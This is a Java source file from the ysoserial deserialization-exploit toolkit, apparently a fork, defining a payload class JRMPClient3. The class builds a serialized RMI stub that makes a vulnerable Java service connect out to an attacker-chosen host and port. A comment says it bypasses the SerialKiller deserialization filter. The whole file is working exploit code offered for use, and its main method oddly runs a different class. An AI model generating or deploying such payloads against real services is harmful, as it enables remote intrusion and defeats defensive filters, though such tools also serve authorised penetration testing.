package ysoserial.payloads;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

/**
 * 可绕过 SerialKiller
 */
@SuppressWarnings({
    "restriction"
})
@PayloadTest(harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
@Authors({Authors.JAYL1n})
public class JRMPClient3 extends PayloadRunner implements ObjectPayload<RemoteObject> {

    public RemoteObject getObject(final String command) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

        RMIConnectionImpl_Stub stub = new RMIConnectionImpl_Stub(ref);
        return stub;
    }


    public static void main(final String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient2.class, args);
    }
}
